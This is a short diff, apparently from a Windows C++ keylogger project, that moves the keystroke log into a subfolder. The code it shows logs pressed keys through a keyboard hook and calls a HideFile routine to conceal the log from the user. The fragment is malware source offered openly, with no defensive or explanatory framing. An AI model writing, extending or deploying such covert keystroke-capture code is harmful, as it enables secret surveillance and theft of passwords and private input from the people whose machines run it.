@@ -9,8 +9,8 @@ DWORD WINAPI Run(void)
 	SetConsoleOutputCP(1251);
 
 	ofstream out;
-	out.open("KeyloggerLog.txt", ios::app);
-	HideFile("KeyloggerLog.txt");
+	out.open("KeyloggerLog//KeyloggerLog.txt", ios::app);
+	HideFile("KeyloggerLog//KeyloggerLog.txt");
 
 	out << endl; OutFullData(out); out << ". Keylogger was started."; out << endl << "\nPRESSED_KEYS: "; out.close();
 
@@ -58,8 +58,8 @@ LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
 
 	ofstream out;
 
-	out.open("KeyloggerLog.txt", ios::app);
-	HideFile("KeyloggerLog.txt");
+	out.open("KeyloggerLog//KeyloggerLog.txt", ios::app);
+	HideFile("KeyloggerLog//KeyloggerLog.txt");
 
 	GetKeyboardState(keyboard_state);
 
